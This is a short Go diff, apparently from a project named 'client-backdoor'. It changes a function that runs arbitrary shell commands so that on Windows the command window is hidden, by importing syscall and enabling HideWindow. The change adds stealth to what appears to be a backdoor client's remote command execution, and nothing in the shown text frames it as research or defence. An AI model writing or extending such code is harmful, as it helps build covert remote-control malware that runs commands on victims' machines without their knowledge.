@@ -11,6 +11,7 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
 
 	"client-backdoor/src/pb/backdoor"
@@ -40,9 +41,9 @@ func Execute(cmd string) (string, error) {
 
 	if runtime.GOOS == "windows" {
 		command = exec.Command("cmd", "/c", cmd)
-		// command.SysProcAttr = &syscall.SysProcAttr{
-		// 	HideWindow: true,
-		// }
+		command.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+		}
 	} else {
 		command = exec.Command("sh", "-c", cmd)
 	}
